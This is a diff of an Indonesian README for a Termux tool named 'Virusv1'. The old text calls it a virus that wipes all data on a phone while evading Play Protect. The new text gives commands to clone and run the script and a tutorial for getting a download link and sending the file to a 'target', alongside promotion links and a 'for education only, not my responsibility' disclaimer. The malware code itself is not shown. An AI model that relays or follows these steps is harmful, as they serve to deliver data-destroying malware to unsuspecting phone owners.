@@ -1,26 +1,46 @@
-# Virusv1
-virus ini dapat menghapus seluruh data hp tanpa terdeteksi oleh play project ingat ini hanya untuk tujuan pendidikan saya tidak bertanggung jawab atas segala kerusakan yang disebabkan oleh virusv1 ini!.
-# Install 
-$pkg update 
+<p align=left> <img src=https://komarev.com/ghpvc/?username=vindraid alt=Demias/> </p>
+# Hi there, I'm TC20 
 
-$pkg upgrade 
+# Comot?
+Kalo Buat Konten Ijin Dulu lah Bang jangan Gitu
+Kasian ma gw lah atau Tag gw di yt @TC20
 
-$pkg install figlet 
+# package
+```Bash
+pkg update
+pkg upgrade
+pkg install figlet
+pkg install bash
+pkg install python
+pip install lolcat
+git clone https://github.com/fahadsyihab06/Virusv1
+cd Virusv1
+bash virusv1.sh
+```
+# tutorial 
 
-$pkg install bash 
+Setelah scriptnya dinstall ketik 1 laku enter setelah itu kalian bakalan dibawah ke link sfilemobinya nah disitu kalian download lali kirim ke target
 
-$pkg install python 
 
-$pip install lolcat  
+# Warnning
+                 Perhatian
 
-$git clone https://github.com/fahadsyihab06/Virusv1 
+📢 saya tidak bertanggung jawab atas segala sesuatu yang merugikan pihak lain maupun didunia atau akhirat 
 
-$cd Virusv1 
+# Download Token
+<li><code>Download<a href="">Token</a></code></li> 
 
-$bash virusv1.sh 
+# Subscribe 
+> Subscribe my channel
+> https://www.youtube.com/@Hacker_Id186
 
-# link YouTube
-https://youtube.com/@TC20367
+# Media sosial
+<li><code>Grup WhatsApp<a href="https://chat.whatsapp.com/BzgGrdKMiOdK8hjbcW0AZb">Link</a></code></li> 
 
-# link grup wa 
-https://chat.whatsapp.com/BzgGrdKMiOdK8hjbcW0AZb
+
+
+# info script 
+SCRIPT 100% AMAN DAN WORK 
+
+
+              
